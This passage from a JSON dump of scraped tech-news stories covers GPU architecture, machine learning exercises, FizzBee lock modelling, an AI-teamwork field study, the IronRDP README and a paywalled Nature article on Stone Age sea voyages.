guarantee, see A trip through the Graphics Pipeline part 9). It is not possible to faithfully emulate the traditional vertex/fragment pipeline using the new capability. Obviously, maintaining ordering guarantees in parallel systems is expensive, but ideally there is a way to opt in when needed, or at least couple work graphs with another mechanism (some form of sorting, which is possible to implement efficiently on GPUs) to re-establish ordering as needed. Thus, I see work graphs as two steps forward, one step back.\n\nCPU convergent evolution\n\nIn theory, when running highly parallel workloads, a traditional multi-core CPU design is doing the same thing as a GPU, and if fully optimized for efficiency, should be competitive. That, arguably, is the design brief for Larrabee, and also motivation for more recent academic work like Vortex. Probably the biggest challenge is power efficiency. As a general trend, CPU designs are diverging into those optimizing single-core performance (performance cores) and those optimizing power efficiency (efficiency cores), with cores of both types commonly present on the same chip. As E-cores become more prevalent, algorithms designed to exploit parallelism at scale may start winning, incentivizing provision of even larger numbers of increasingly efficient cores, even if underpowered for single-threaded tasks.\n\nAn advantage of this approach is that it doesn’t change the execution model, so existing languages and tools can still be used. Unfortunately, most existing languages are poor at expressing and exploiting parallelism at both the SIMD and thread level – shaders have a more limited execution model but at least it’s clear how to execute them in parallel efficiently. And for thread-level parallelism, avoiding performance loss from context switches is challenging. Hopefully, newer languages such as Mojo will help, and potentially can be adapted to GPU-like execution models as well.\n\nI’m skeptical this approach will actually become competitive with GPUs and AI accelerators, as there is just a huge gap in throughput per watt compared with GPUs – about an order of magnitude. Also, GPUs and AI accelerators won’t be standing still either.\n\nMaybe the hardware is already there?\n\nIt’s possible that there is hardware currently shipping that meets my criteria for a good parallel computer, but its potential is held back by software. GPUs generally have a “command processor” onboard, which, in cooperation with the host-side driver, breaks down the rendering and compute commands into chunks to be run by the actual execution units. Invariably, this command processor is hidden and cannot run user code. Opening that up could be quite interesting. A taste of that is in Hans-Kristian Arntzen’s notes on implementing work graphs in open source drivers: Workgraphs in vkd3d-proton.\n\nGPU designs vary in how much is baked into the hardware and how much is done by a command processor. Programmability is a good way to make things more flexible. The main limiting factor is the secrecy around such designs. Even in GPUs with open source drivers, the firmware (which is what runs on the command processor) is very locked down. Of course, a related challenge is security; opening up the command processor to user code increases the vulnerability surface area considerably. But from a research perspective, it should be interesting to explore what’s possible aside from security concerns.\n\nAnother interesting direction is the rise of “Accelerated Processing Units” which integrate GPUs and powerful CPUs in the same address space. Conceptually, these are similar to integrated graphics chips, but those rarely have enough performance to be interesting. From what I’ve seen, running existing APIs on such hardware (Vulkan for compute shaders, or one of the modern variants of OpenCL) would not have significant latency advantages for synchronizing work back to the CPU, due to context switching overhead. It’s possible a high priority or dedicated thread might quickly process items placed in a queue by GPU-side tasks. The key idea is queues running at full throughput, rather than async remote procedure calls with potentially huge latency.\n\nComplexity\n\nTaking a step back, one of the main features of the GPU ecosystem is a dizzying level of complexity. There’s the core parallel computer, then lots of special function hardware (and the scope of this is increasing, especially with newer features such as ray tracing), then big clunky mechanisms to get work scheduled and run. Those start with the basic compute shader dispatch mechanism (a 3D grid of x, y, z dimensions, 16 bits each), and then augment that with various indirect command encoding extensions.\n\nWork graphs also fit into the category of complexifying the execution model to work around the limitations of the primitive 3D grid. I was initially excited about their prospect, but when I took a closer look, I found they were inadequate for expressing any of the producer/consumer relationships in Vello.\n\nThere’s a lot of accidental complexity as well. There are multiple competing APIs, each with subtly different semantics, which makes it especially hard to write code once and have it just work.\n\nCUDA is adding lots of new features, some of which improve autonomy as I’ve been wanting, and there is a tendency for graphics APIs to adopt features from CUDA. However, there’s also a lot of divergence between these ecosystems (work graphs can’t be readily adapted to CUDA, and it’s very unlikely graphics shaders will get independent thread scheduling any time soon).\n\nThe complexity of the GPU ecosystem has many downstream effects. Drivers and shader compilers are buggy and insecure, and there is probably no path to really fixing that. Core APIs tend to be very limited in functionality and performance, so there’s a dazzling array of extensions that need to be detected at runtime, and the most appropriate permutation selected. This in turn makes it far more likely to run into bugs that appear only with specific combinations of features, or on particular hardware.\n\nAll this is in fairly stark contrast to the CPU world. A modern CPU is also dazzlingly complex, with billions of transistors, but it is rooted in a much simpler computational model. From a programmer perspective, writing code for a 25 billion transistor Apple M3 isn’t that different from, say, a Cortex M0, which can be made with about 48,000 transistors. Similarly, a low performance RISC-V implementation is a reasonable student project. Obviously the M3 is doing a lot more with branch prediction, superscalar issue, memory hierarchies, op fusion, and other performance tricks, but it’s recognizably doing the same thing as a vastly smaller and simpler chip.\n\nIn the past, there were economic pressures towards replacing special-purpose circuitry with general purpose compute performance, but those incentives are shifting. Basically, if you’re optimizing for number of transistors, then somewhat less efficient general purpose compute can be kept busy almost all the time, while special purpose hardware is only justified if there is high enough utilization in the workload. However, as Dennard scaling has ended and we’re more constrained by power than transistor count, special purpose hardware starts winning more; it can simply be powered down if it isn’t used by the workload. The days of a purely RISC computational model are probably over. What I’d like to see replacing it is an agile core (likely RISC-V) serving as the control function for a bunch of special-purpose accelerator extensions. That certainly is the model of the Vortex project among others.\n\nConclusion\n\nIn his talk shortly before retirement, Nvidia GPU architect Erik Lindholm said (in the context of work creation and queuing systems), “my career has been about making things more flexible, more programmable. It’s not finished yet. There’s one more step that I feel that needs to be done, and I’ve been pursuing this at Nvidia Research for many years.” I agree, and my own work would benefit greatly. Now that he has retired, it is not clear who will take up the mantle. It may be Nvidia disrupting their previous product line with a new approach as they have in the past. It may be an upstart AI accelerator making a huge grid of low power processors with vector units, that just happens to be programmable. It might be CPU efficiency cores evolving to become so efficient they compete with GPUs.\n\nOr it might not happen at all. On the current trajectory, GPUs will squeeze out incremental improvements on existing graphics workloads at the cost of increasing complexity, and AI accelerators will focus on improving the throughput of slop generation to the exclusion of everything else.\n\nIn any case, there is an opportunity for intellectually curious people to explore the alternate universe in which the good parallel computer exists; architectures can be simulated on FPGA like Vortex, and algorithms can be prototyped on multicore wide-SIMD CPUs. We can also start to think about what a proper programming language for such a machine might look like, as frustrating as it is to not have real hardware to run it on.\n\nProgress on a good parallel computer would help my own little sliver of work, trying to make a fully parallel 2D renderer with modest resource requirements. I’ve got to imagine it would in addition help AI efforts, potentially unlocking sparse techniques that can’t run on existing hardware. I also think there’s a golden era of algorithms that can be parallel but aren’t a win on current GPUs, waiting to be developed.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "9e0fba41c956e10b",
    "title": {
      "en": "Pen and Paper Exercises in Machine Learning (2022)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arxiv.org/abs/2206.13446",
    "score": 398,
    "by": "ibobev",
    "time": 1742587632,
    "content": "This is a collection of (mostly) pen-and-paper exercises in machine learning. The exercises are on the following topics: linear algebra, optimisation, directed graphical models, undirected graphical models, expressive power of graphical models, factor graphs and message passing, inference for hidden Markov models, model-based learning (including ICA and unnormalised models), sampling and Monte-Carlo integration, and variational inference.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ed5d15f12be2c53a",
    "title": {
      "en": "Locks, leases, fencing tokens, FizzBee",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://surfingcomplexity.blog/2025/03/03/locks-leases-fencing-tokens-fizzbee/",
    "score": 48,
    "by": "azhenley",
    "time": 1742335006,
    "content": "Locks, leases, fencing tokens,FizzBee!\n\n\t\t\t\tLorin Hochstein\n\n\t\t\t\t\tformal methods\n\n\t\t\t\tMarch 3, 2025March 3, 2025\n\n\t\t\t7 Minutes\n\nFizzBee is a new formal specification language, originally announced back in May of last year. FizzBee’s author, Jayaprabhakar (JP) Kadarkarai, reached out to me recently and asked me what I thought of it, so I decided to give it a go.\n\nTo play with FizzBee, I decided to model some algorithms that solve the mutual exclusion problem, more commonly known as locking. Mutual exclusion algorithms are a classic use case for formal modeling, but here’s some additional background motivation: a few years back, there was an online dust-up between Martin Kleppmann (author of the excellent book Designing Data-Intensive Applications, commonly referred to as DDIA) and Salvatore Sanfilippo (creator of Redis, and better known by his online handle antirez). They were arguing about the correctness of an algorithm called Redlock that claims to achieve fault-tolerant distributed locking. Here are some relevant links:\n\nDistributed Locks with Redis – description of the Redlock algorithm\n\nHow to do distributed locking – Kleppmann’s critique of the Redlock algorithm\n\nIs Redlock safe? – antirez’s rebuttal to Kleppmann\n\nAs a FizzBee exercise, I wanted to see how difficult it was to model the problem that Kleppmann had identified in Redlock.\n\nKeep in mind here that I’m just a newcomer to the language writing some very simple models as a learning exercise.\n\nCritical sections\n\nHere’s my first FizzBee model, it models the execution of two processes, with an invariant that states that at most one process can be in the critical section at a time. Note that this model doesn’t actually enforce mutual exclusion, so I was just looking to see that the assertion was violated.\n\n123456789101112131415161718192021222324252627# Invariant to checkalways assertion MutualExclusion:return not any([p1.in_cs and p2.in_cs for p1 in processesfor p2 in processesif p1 != p2])NUM_PROCESSES = 2role Process:action Init:self.in_cs = Falseaction Next:# before critical sectionpass# critical sectionself.in_cs = Truepass# after critical sectionself.in_cs = Falsepassaction Init:processes = []for i in range(NUM_PROCESSES):processes.append(Process())\n\nThe “pass” statements are  no-ops, I just use them as stand-ins for “code that would execute before/during/after the critical section”.\n\nFizzBee is built on Starlark, which is a subset of Python, which why the model looks so Pythonic. Writing a FizzBee model felt like writing a PlusCal model, without the need for specifying labels explicitly, and also with a much more familiar syntax.\n\nThe lack of labels was both a blessing and a curse. In PlusCal, the control state is something you can explicitly reference in your model. This is useful for when you want to specify a critical section as an invariant. Because FizzBee doesn’t have labels, I had to create a separate variable called “in_cs” to be able to model when a process was in its critical section.  In general, though, I find PlusCal’s label syntax annoying, and I’m happy that FizzBee doesn’t require it.\n\nFizzBee has an online playground: you can copy the model above and paste it directly into the playground and click “Run”, and it will tell you that the invariant failed.\n\n1FAILED: Model checker failed. Invariant: MutualExclusion\n\nThe “Error Formatted” view shows how the two processes both landed on line 17, hence violating mutual exclusion:\n\nLocks\n\nNext up, I modeled locking in FizzBee. In general, I like to model a lock as a set, where taking the lock means adding the id of the process to the set, because if I need to, I can see:\n\nwho holds the lock by the elements of the set\n\nif two processes somehow manage to take the same lock (multiple elements in the set)\n\nHere’s my FizzBee mdoel:\n\n123456789101112131415161718192021222324252627282930313233343536373839always assertion MutualExclusion:return not any([p1.in_cs and p2.in_cs for p1 in processesfor p2 in processesif p1 != p2])NUM_PROCESSES = 2role Process:action Init:self.in_cs = Falseaction Next:# before critical sectionpass# acquire lockatomic:require not locklock.add(self.__id__)## critical section#self.in_cs = Truepassself.in_cs = False# release locklock.clear()# after critical sectionpassaction Init:processes = []lock = set()in_cs = set()for i in range(NUM_PROCESSES):processes.append(Process())\n\nBy default, each statement in FizzBee is treated atomically, and you can specify an atomic block to treat multiple statements automatically.\n\nIf you run this in the playground, you’ll see that the invariant holds, but there’s a different problem: deadlock\n\n12DEADLOCK detectedFAILED: Model checker failed\n\nFizzBee’s model checker does two things by default:\n\nChecks for deadlock\n\nAssumes that a thread can crash after any arbitrary statement\n\nIn the “Error Formatted” view, you can see what happened. The first process took the lock and then crashed. This leads to deadlock, because the lock never gets released.\n\nLeases\n\nIf we want to build a fault-tolerant locking solution, we need to handle the scenario where a process fails while it owns the lock. The Redlock algorithm uses the concept of a lease, which is a lock that expires after a period of time.\n\nTo model leases, we now need to model time. To keep things simple, my model assumes a global clock that all processes have access to.\n\n1234567891011121314151617181920212223242526272829303132333435363738394041NUM_PROCESSES = 2LEASE_LENGTH = 10always assertion MutualExclusion:return not any([p1.in_cs and p2.in_cs for p1 in processesfor p2 in processesif p1 != p2])action AdvanceClock:clock += 1role Process:action Init:self.in_cs = Falseaction Next:atomic:require lock.owner == None or \\clock >= lock.expiration_timelock = record(owner=self.__id__,expiration_time=clock+LEASE_LENGTH)# check that we still have the lockif lock.owner == self.__id__:# critical sectionself.in_cs = Truepassself.in_cs = False# release the lockif lock.owner == self.__id__:lock.owner = Noneaction Init:processes = []# global clockclock = 0lock = record(owner=None, expiration_time=-1)for i in range(NUM_PROCESSES):processes.append(Process())\n\nNow the lock has an expiration date, so we don’t have the deadlock problem anymore.  But the invariant is no longer always true.\n\nFizzBee also has a neat view called the “Explorer” where you can step through and see how the state variables change over time. Here’s a screenshot, which shows the problem:\n\nThe problem is that one process can think it holds the lock, but it the lock has actually expired, which means another process can take the lock, and they can both end up in the critical section.\n\nFencing tokens\n\nKleppmann noted this problem with Redlock, that it was vulnerable to issues where a process’s execution could pause for some period of time (e.g., due to garbage collection). Kleppmann proposed using fencing tokens to prevent a process from accessing a shared resource with an expired lock.\n\nHere’s how I modeled fencing tokens:\n\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152NUM_PROCESSES = 2LEASE_LENGTH = 10always assertion MutualExclusion:return not any([p1.in_cs and p2.in_cs for p1 in processesfor p2 in processesif p1 != p2])atomic action AdvanceClock:clock += 1role Process:action Init:self.in_cs = Falseaction Next:atomic:require lock.owner == None or \\clock >= lock.expiration_timelock = record(owner=self.__id__,expiration_time=clock+LEASE_LENGTH)self.token = next_tokennext_token += 1# can only enter the critical section# if we have the highest token seen so faratomic:if self.token > last_token_seen:last_token_seen = self.token# critical sectionself.in_cs = Truepass# after critical sectionself.in_cs = False# release the lockatomic:if lock.owner == self.__id__:lock.owner = Noneaction Init:processes = []# global clockclock = 0next_token = 1last_token_seen = 0lock = record(owner=None, expiration_time=-1)for i in range(NUM_PROCESSES):processes.append(Process())\n\nHowever, if you run this through the model checker, you’ll discover that the invariant is also violated!\n\nIt turns out that fencing tokens don’t protect against the scenario where two processes both believe they hold the lock, and the lower token reaches the shared resource before the higher token:\n\nA scenario where fencing tokens don’t ensure mutual exclusion\n\nI reached out to Martin Kleppmann to ask about this, and he agreed that fencing tokens would not protect against this scenario.\n\nImpressions\n\nI found FizzBee surprisingly easy to get started with, although I only really scratched the surface here. In my case, having experience with PlusCal helped a lot, as I already knew how to write my specifications in a similar style. You can write your specs in TLA+ style, as a collection of atomic actions rather than as one big non-atomic action, but the PlusCal-style felt more natural for these particular problems I was modeling.\n\nThe Pythonic syntax will be much more familiar to programmers than PlusCal and TLA+, which should help with adoption. In some cases, though I found myself missing the conciseness of the set notation that languages like TLA+ and Alloy support. I ended up leveraging Python’s list comprehensions, which have a set-builder-notation feel to them.\n\n Newcomers to formal specification will still have to learn how to think in terms of TLA+ style models: while FizzBee looks like Python, conceptually it is like TLA+, a notation for specifying a set of state-machine behaviors, which is very different from a Python program. I don’t know what it will be like for learners.\n\nI was a little bit confused by FizzBee’s default behavior of a thread being able to crash at any arbitrary point, but that’s configurable, and I was able to use it to good effect to show deadlock in the lock model above.\n\nFinally, while I read Kleppmann’s article years ago, I never noticed the issue with fencing tokens until I actually tried to model it explicitly. This is a good reminder of the value of formally specifying an algorithm. I fooled myself into thinking I understood it, but I actually hadn’t. It wasn’t until I went through the exercise of modeling it that I discovered something about its behavior that I hadn’t realized before.\nShare this:TwitterFacebookLike Loading...\n\nFutexes in TLA+October 5, 2024In \"formal methods\"Modeling a CLH lock inTLA+August 4, 2024In \"formal methods\"Reproducing a Java 21 virtual threads deadlock scenario withTLA+August 1, 2024In \"formal methods\"\n\n\t\t\t\t\tPublished by Lorin Hochstein\n\n\t\t\t\t\tView all posts by Lorin Hochstein\n\n\t\t\tPublished\n\t\t\tMarch 3, 2025March 3, 2025",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c9d4c74469cb3d9b",
    "title": {
      "en": "The Cybernetic Teammate",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.oneusefulthing.org/p/the-cybernetic-teammate",
    "score": 35,
    "by": "tobr",
    "time": 1742647947,
    "content": "Share this postOne Useful ThingThe Cybernetic TeammateCopy linkFacebookEmailNotesMoreDiscover more from One Useful ThingTrying to understand the implications of AI for work, education, and life. By Prof. Ethan MollickOver 272,000 subscribersSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign inThe Cybernetic TeammateHaving an AI on your team can increase performance, provide expertise, and improve your experienceEthan MollickMar 22, 2025319Share this postOne Useful ThingThe Cybernetic TeammateCopy linkFacebookEmailNotesMore3142ShareOver the past couple years, we have learned that AI can boost the productivity of individual knowledge workers ranging from consultants to lawyers to coders. But most knowledge work isn’t purely an individual activity; it happens in groups and teams. And teams aren't just collections of individuals – they provide critical benefits that individuals alone typically can't, including better performance, sharing of expertise, and social connections. So, what happens when AI acts as a teammate? This past summer we conducted a pre-registered, randomized controlled trial of 776 professionals at Procter and Gamble, the consumer goods giant, to find out.We are ready to share the results in a new working paper: The Cybernetic Teammate: A Field Experiment on Generative AI Reshaping Teamwork and Expertise. Given the scale of this project, it shouldn’t be a surprise that this paper was a massive team effort coordinated by the Digital Data Design Institute at Harvard and led by Fabrizio Dell’Acqua, Charles Ayoubi, and Karim Lakhani, along with Hila Lifshitz, Raffaella Sadun, Lilach Mollick, me, and our partners at Procter and Gamble: Yi Han, Jeff Goldman, Hari Nair, and Stewart Taub. We wanted this experiment to be a test of real-world AI use, so we were able to replicate the product development process at P&G, thanks to the cooperation and help of the company (which had no control over the results or data). To do that, we ran one-day workshops where professionals from Europe and the US had to actually develop product ideas, packaging, retail strategies and other tasks for the business units they really worked for, which included baby products, feminine care, grooming, and oral care. Teams with the best ideas had them submitted to management for approval, so there were some real stakes involved.We also had two kinds of professionals in our experiment: commercial experts and technical R&D experts. They were generally very experienced, with over 10 years of work at P&G alone. We randomly created teams consisting of one person in each specialty. Half were given GPT-4 or GPT-4o to use, and half were not. We also picked a random set of both types of specialists to work alone, and gave half of them access to AI. Everyone assigned to the AI condition was given a training session and a set of prompts they could use or modify. This design allowed us to isolate the effects of AI and teamwork independently and in combination. We measured outcomes across multiple dimensions including solution quality (as determined by at least two expert judges per solution), time spent, and participants' emotional responses. What we found was interesting.AI boosts performanceWhen working without AI, teams outperformed individuals by a significant amount, 0.24 standard deviations (providing a sigh of relief for every teacher and manager who has pushed the value of teamwork). But the surprise came when we looked at AI-enabled participants. Individuals working with AI performed just as well as teams without AI, showing a 0.37 standard deviation improvement over the baseline. This suggests that AI effectively replicated the performance benefits of having a human teammate – one person with AI could match what previously required two-person collaboration.Teams with AI performed best overall with a 0.39 standard deviation improvement, though the difference between individuals with AI and teams with AI wasn't statistically significant. But we found an interesting pattern when looking at truly exceptional solutions, those ranking in the top 10% of quality. Teams using AI were significantly more likely to produce these top-tier solutions, suggesting that there is value in having human teams working on a problem that goes beyond the value of working with AI alone.Both AI-enabled groups also worked much faster, saving 12-16% of the time spent by non-AI groups while producing solutions that were substantially longer and more detailed than those from non-AI groups.Expertise boundaries vanishWithout AI, we saw clear professional silos in how people approached problems. R&D specialists consistently proposed technically-oriented solutions while Commercial specialists suggested market-focused ideas. When these specialists worked together in teams without AI, they produced more balanced solutions through their cross-functional collaboration (teamwork wins again!).But this was another place AI made a big difference. When paired with AI, both R&D and Commercial professionals, in teams or when working alone, produced balanced solutions that integrated both technical and commercial perspectives. The distinction between specialists virtually disappeared in AI-aided conditions, as you can see in the graph. We saw a similar effect on teams.This effect was especially pronounced for employees less familiar with product development. Without AI, these less experienced employees performed relatively poorly even in teams. But with AI assistance, they suddenly performed at levels comparable to teams that included experienced members. AI effectively helped people bridge functional knowledge gaps, allowing them to think and create beyond their specialized training, and helped amateurs act more like experts.Working with AI led to better emotional experiencesA particularly surprising finding was how AI affected the emotional experience of work. Technological change, and especially AI, has often been associated with reduced workplace satisfaction and increased stress. But our results showed the opposite, at least in this case.Positive emotions increase and negative emotions decrease after working with AI compared to teams and individuals who did not have AI access.People using AI reported significantly higher levels of positive emotions (excitement, energy, and enthusiasm) compared to those working without AI. They also reported lower levels of negative emotions like anxiety and frustration. Individuals working with AI had emotional experiences comparable to or better than those working in human teams. While we conducted a thorough study that involved a pre-registered randomized controlled trial, there are always caveats to these sorts of studies. For example, it is possible that larger teams would show very different results when working with AI, or that working with AI for longer projects may impact its value. It is also possible that our results represent a lower bound: all of these experiments were conducted with GPT-4 or GPT-4o, less capable models than what are available today; the participants did not have a lot of prompting experience so they may not have gotten as much benefit; and chatbots are not really built for teamwork. There is a lot more detail on all of this in the paper, but limitations aside, the bigger question might be: why does this all matter?Why This MattersOrganizations have primarily viewed AI as just another productivity tool, like a better calculator or spreadsheet. This made sense initially but has become increasingly limiting as models get better and as recent data finds users most often employ AI for critical thinking and complex problem solving, not just routine productivity tasks. Companies that focus solely on efficiency gains from AI will not only find workers unwilling to share their AI discoveries for fear of making themselves redundant but will also miss the opportunity to think bigger about the future of work. To successfully use AI, organizations will need to change their analogies. Our findings suggest AI sometimes functions more like a teammate than a tool. While not human, it replicates core benefits of teamwork—improved performance, expertise sharing, and positive emotional experiences. This teammate perspective should make organizations think differently about AI. It suggests a need to reconsider team structures, training programs, and even traditional boundaries between specialties. At least with the current set of AI tools, AI augments human capabilities. It democratizes expertise as well, enabling more employees to contribute meaningfully to specialized tasks and potentially opening new career pathways.The most exciting implication may be that AI doesn't just automate existing tasks, it changes how we can think about work itself. The future of work isn't just about individuals adapting to AI, it's about organizations reimagining the fundamental nature of teamwork and management structures themselves. And that's a challenge that will require not just technological solutions, but new organizational thinking.SubscribeLeave a comment319 Likes∙42 Restacks319Share this postOne Useful ThingThe Cybernetic TeammateCopy linkFacebookEmailNotesMore3142SharePrevious",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "a46cfad92e25d229",
    "title": {
      "en": "IronRDP: a Rust implementation of Microsoft's RDP protocol",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/Devolutions/IronRDP",
    "score": 516,
    "by": "mikece",
    "time": 1742571327,
    "content": "IronRDP\n\nA collection of Rust crates providing an implementation of the Microsoft Remote Desktop Protocol, with a focus on security.\nDemonstration\n\n    ironrdp-tauri-client-hackaton-result.mp4\n\nVideo Codec Support\nSupported codecs:\n\nUncompressed raw bitmap\nInterleaved Run-Length Encoding (RLE) Bitmap Codec\nRDP 6.0 Bitmap Compression\nMicrosoft RemoteFX (RFX)\n\nExamples\nironrdp-client\nA full-fledged RDP client based on IronRDP crates suite, and implemented using non-blocking, asynchronous I/O.\ncargo run --bin ironrdp-client -- <HOSTNAME> --username <USERNAME> --password <PASSWORD>\n\nscreenshot\nExample of utilizing IronRDP in a blocking, synchronous fashion.\nThis example showcases the use of IronRDP in a blocking manner. It\ndemonstrates how to create a basic RDP client with just a few hundred lines\nof code by leveraging the IronRDP crates suite.\nIn this basic client implementation, the client establishes a connection\nwith the destination server, decodes incoming graphics updates, and saves the\nresulting output as a BMP image file on the disk.\ncargo run --example=screenshot -- --host <HOSTNAME> --username <USERNAME> --password <PASSWORD> --output out.bmp\n\nHow to enable RemoteFX on server\nRun the following PowerShell commands, and reboot.\nSet-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name 'ColorDepth' -Type DWORD -Value 5\nSet-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name 'fEnableVirtualizedGraphics' -Type DWORD -Value 1\n\nAlternatively, you may change a few group policies using gpedit.msc:\n\nRun gpedit.msc.\n\nEnable Computer Configuration/Administrative Templates/Windows Components/Remote Desktop Services/Remote Desktop Session Host/Remote Session Environment/RemoteFX for Windows Server 2008 R2/Configure RemoteFX\n\nEnable Computer Configuration/Administrative Templates/Windows Components/Remote Desktop Services/Remote Desktop Session Host/Remote Session Environment/Enable RemoteFX encoding for RemoteFX clients designed for Windows Server 2008 R2 SP1\n\nEnable Computer Configuration/Administrative Templates/Windows Components/Remote Desktop Services/Remote Desktop Session Host/Remote Session Environment/Limit maximum color depth\n\nReboot.\n\nArchitecture\nSee the ARCHITECTURE.md document.\nGetting help\n\nReport bugs in the issue tracker\nDiscuss the project on the matrix room",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "feb73d0638f074a2",
    "title": {
      "en": "Ancient DNA Shows Stone Age Europeans Voyaged by Sea to Africa",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.nature.com/articles/d41586-025-00764-2",
    "score": 113,
    "by": "gmays",
    "time": 1742494980,
    "content": "NEWS\n                12 March 2025\n\n            Ancient DNA shows Stone Age Europeans voyaged by sea to Africa\n\n                    Roughly 8,000-year-old remains unearthed from present-day Tunisia held a surprise: European hunter-gatherer ancestry.\n\n                By\n\n                Ewen Callaway\n\n                    Ewen Callaway\n\n                            View author publications\n\n                                You can also search for this author in PubMed\n                                    Google Scholar\n\n            Twitter\n\n            Facebook\n\n            Email\n\n        <div class=\"c-nature-box c-nature-box--side \" data-component=\"entitlement-box\">\n\n            <div class=\"js-access-button\">\n                <a href=\"https://wayf.springernature.com?redirect_uri&#x3D;https%3A%2F%2Fwww.nature.com%2Farticles%2Fd41586-025-00764-2\" class=\"c-article__button\" data-test=\"ra21\">\n                    <svg class=\"u-icon\" width=\"18\" height=\"18\" aria-hidden=\"true\" focusable=\"false\"><use href=\"#icon-institution\"></use></svg>\n                    <span class=\"c-article__button-text\">Access through your institution</span>\n                </a>\n            </div>\n\n            <div class=\"js-buy-button\">\n                <a href=\"#access-options\" class=\"c-article__button c-article__button--inverted\" data-test=\"ra21\">\n                    <span>Buy or subscribe</span>\n                </a>\n            </div>\n\n        </div>\n\n                        .readcube-buybox { display: none !important;}\n\n                    Thousands of years before Odysseus crossed the ‘wine-dark sea’ in Homer’s epic poem The Odyssey, hunter-gatherers might have island-hopped their way to Africa across the Mediterranean.\n\n                        Access options\n\n        <div class=\"c-nature-box c-nature-box--side \" data-component=\"entitlement-box\">\n\n            <div class=\"js-access-button\">\n                <a href=\"https://wayf.springernature.com?redirect_uri&#x3D;https%3A%2F%2Fwww.nature.com%2Farticles%2Fd41586-025-00764-2\" class=\"c-article__button\" data-test=\"ra21\">\n                    <svg class=\"u-icon\" width=\"18\" height=\"18\" aria-hidden=\"true\" focusable=\"false\"><use href=\"#icon-institution\"></use></svg>\n                    <span class=\"c-article__button-text\">Access through your institution</span>\n                </a>\n            </div>\n\n        </div>\n\n                Access through your institution\n\n                Change institution\n\n                Buy or subscribe\n\n    /* style specs start */\n\n/* style specs end */\n\n        Access Nature and 54 other Nature Portfolio journals\n\n        Get Nature+, our best-value online-access subscription\n\n          24,99€ /30days\n\n        cancel any time\n\n        Learn more\n\n    Subscription info for Korean customersWe have a dedicated website for our Korean customers. Please go to natureasia.com to subscribe to this journal.Go to natureasia.com\n\n      Rent or buy this article\n      Prices vary by article type\n      from$1.95\n      to$39.95\n\n        Learn more\n\n    Prices may be subject to local taxes which are calculated during checkout\n          /* style specs start */\n          style {\n            display: none !important;\n          }\n          .LiveAreaSection * {\n            align-content: stretch;\n            align-items: stretch;\n            align-self: auto;\n            animation-delay: 0s;\n            animation-direction: normal;\n            animation-duration: 0s;\n            animation-fill-mode: none;\n            animation-iteration-count: 1;\n            animation-name: none;\n            animation-play-state: running;\n            animation-timing-function: ease;\n            azimuth: center;\n            backface-visibility: visible;\n            background-attachment: scroll;\n            background-blend-mode: normal;\n            background-clip: borderBox;\n            background-color: transparent;\n            background-image: none;\n            background-origin: paddingBox;\n            background-position: 0 0;\n            background-repeat: repeat;\n            background-size: auto auto;\n            block-size: auto;\n            border-block-end-color: currentcolor;\n            border-block-end-style: none;\n            border-block-end-width: medium;\n            border-block-start-color: currentcolor;\n            border-block-start-style: none;\n            border-block-start-width: medium;\n            border-bottom-color: currentcolor;\n            border-bottom-left-radius: 0;\n            border-bottom-right-radius: 0;\n            border-bottom-style: none;\n            border-bottom-width: medium;\n            border-collapse: separate;\n            border-image-outset: 0s;\n            border-image-repeat: stretch;\n            border-image-slice: 100%;\n            border-image-source: none;\n            border-image-width: 1;\n            border-inline-end-color: currentcolor;\n            border-inline-end-style: none;\n            border-inline-end-width: medium;\n            border-inline-start-color: currentcolor;\n            border-inline-start-style: none;\n            border-inline-start-width: medium;\n            border-left-color: currentcolor;\n            border-left-style: none;\n            border-left-width: medium;\n            border-right-color: currentcolor;\n            border-right-style: none;\n            border-right-width: medium;\n            border-spacing: 0;\n            border-top-color: currentcolor;\n            border-top-left-radius: 0;\n            border-top-right-radius: 0;\n            border-top-style: none;\n            border-top-width: medium;\n            bottom: auto;\n            box-decoration-break: slice;\n            box-shadow: none;\n            box-sizing: border-box;\n            break-after: auto;\n            break-before: auto;\n            break-inside: auto;\n            caption-side: top;\n            caret-color: auto;\n            clear: none;\n            clip: auto;\n            clip-path: none;\n            color: initial;\n            column-count: auto;\n            column-fill: balance;\n            column-gap: normal;\n            column-rule-color: currentcolor;\n            column-rule-style: none;\n            column-rule-width: medium;\n            column-span: none;\n            column-width: auto;\n            content: normal;\n            counter-increment: none;\n            counter-reset: none;\n            cursor: auto;\n            display: inline;\n            empty-cells: show;\n            filter: none;\n            flex-basis: auto;\n            flex-direction: row;\n            flex-grow: 0;\n            flex-shrink: 1;\n            flex-wrap: nowrap;\n            float: none;\n            font-family: initial;\n            font-feature-settings: normal;\n            font-kerning: auto;\n            font-language-override: normal;\n            font-size: medium;\n            font-size-adjust: none;\n            font-stretch: normal;\n            font-style: normal;\n            font-synthesis: weight style;\n            font-variant: normal;\n            font-variant-alternates: normal;\n            font-variant-caps: normal;\n            font-variant-east-asian: normal;\n            font-variant-ligatures: normal;\n            font-variant-numeric: normal;\n            font-variant-position: normal;\n            font-weight: 400;\n            grid-auto-columns: auto;\n            grid-auto-flow: row;\n            grid-auto-rows: auto;\n            grid-column-end: auto;\n            grid-column-gap: 0;\n            grid-column-start: auto;\n            grid-row-end: auto;\n            grid-row-gap: 0;\n            grid-row-start: auto;\n            grid-template-areas: none;\n            grid-template-columns: none;\n            grid-template-rows: none;\n            height: auto;\n            hyphens: manual;\n            image-orientation: 0deg;\n            image-rendering: auto;\n            image-resolution: 1dppx;\n            ime-mode: auto;\n            inline-size: auto;\n            isolation: auto;\n            